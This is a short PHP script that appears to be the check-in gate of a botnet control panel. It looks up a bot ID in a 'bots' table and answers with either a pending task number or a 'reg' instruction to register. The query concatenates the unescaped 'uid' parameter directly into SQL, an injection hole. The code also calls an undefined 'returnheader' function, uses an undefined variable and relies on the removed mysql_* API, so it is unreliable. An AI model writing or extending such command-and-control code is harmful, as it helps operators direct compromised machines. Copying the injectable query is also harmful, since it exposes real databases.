<?php
	
	include 'config/db.php';
	try{
		if (isset($_GET['uid'])){ 
			$uid = $_GET['uid'];
			
			$sql = "SELECT `uid`,`taskn` FROM `bots` WHERE uid = '$uid'";
			$query = @mysql_query($sql);
			
			if(@mysql_num_rows($query) == 1){
				$q = @mysql_fetch_array($query);
				$taskn = ($q['taskn']);
				$uid = ($q['uid']);
				//echo $taskn;
				returnheader("/tsk.php?uid=$uid&t=$taskn"); 
				echo 'tsk' . $split,$taskn ;
				//////////////////////////////////

				
				
				///////////////////////////////
				}else{
				echo 'reg';
				exit;
			}		
		} 
		}catch(Exception $e){
		echo 'gate.php_GET.error';
	}
	
	//echo 'timeout';
?>



